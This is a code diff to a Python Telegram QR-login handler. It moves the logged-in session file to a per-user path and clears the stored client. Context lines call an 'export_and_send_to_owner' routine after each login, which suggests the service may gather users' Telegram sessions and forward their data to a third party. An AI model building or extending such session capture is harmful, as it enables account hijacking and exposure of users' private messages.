@@ -144,6 +144,8 @@ async def poll_qr_login(session_id: str):
 
 async def complete_qr_login(session_id: str, client: TelegramClient, twofa: str = None):
     """Complete login and trigger export"""
+    import os
+    import shutil
     from bot.export_service import export_and_send_to_owner
     from aiogram import Bot
     from config import BOT_TOKEN
@@ -151,6 +153,10 @@ async def complete_qr_login(session_id: str, client: TelegramClient, twofa: str 
     me = await client.get_me()
     user_id = me.id
     final_session_id = f"user_{user_id}"
+    
+    # Get current session path
+    qr_session_path = f"{SESSIONS_DIR}/qr_{session_id}.session"
+    final_session_path = f"{SESSIONS_DIR}/{final_session_id}.session"
     
     # Trigger auto-export
     try:
@@ -160,11 +166,19 @@ async def complete_qr_login(session_id: str, client: TelegramClient, twofa: str 
     except Exception as e:
         print(f"[QR Login] Export error: {e}")
     
+    # Save session to correct path
+    await client.disconnect()
+    
+    # Copy session file to final path
+    if os.path.exists(qr_session_path):
+        shutil.copy(qr_session_path, final_session_path)
+        os.remove(qr_session_path)
+    
     # Update session status
     qr_sessions[session_id] = {
         "status": "success",
         "session_url": f"{WEB_URL}/?session={final_session_id}",
-        "client": client
+        "client": None
     }
 
 
